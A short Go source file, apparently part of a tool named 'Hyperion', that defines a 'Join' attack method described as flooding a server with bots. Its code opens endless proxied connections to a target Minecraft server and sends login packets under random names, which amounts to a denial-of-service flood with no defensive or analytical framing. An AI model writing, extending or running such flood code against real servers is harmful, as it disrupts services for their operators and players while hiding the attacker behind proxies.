package methods

import (
	"Hyperion/core"
	"Hyperion/core/proxy"
	"Hyperion/mc"
	"Hyperion/mc/mcutils"
	"Hyperion/utils"
	"time"
)

type Join struct{}

func (join Join) Name() string {
	return "Join"
}

func (join Join) Description() string {
	return "Floods server with bots"
}

func (join Join) Start(info *core.AttackInfo, dialPool *proxy.DialPool) {
	for {
		for i := 0; i < info.PerDelay; i++ {
			go func() {
				conn, _ := mc.DialMC(info.Ip, info.Port, dialPool.GetNext())
				mcutils.WriteHandshake(conn, info.Ip, info.Port, info.Protocol, mcutils.Login)
				mcutils.WriteLoginPacket(conn, utils.RandomName(10), false, nil)
			}()
		}
		time.Sleep(info.Delay)
	}
}
func (join Join) Stop() {
	// implementation for stopping the join method
}
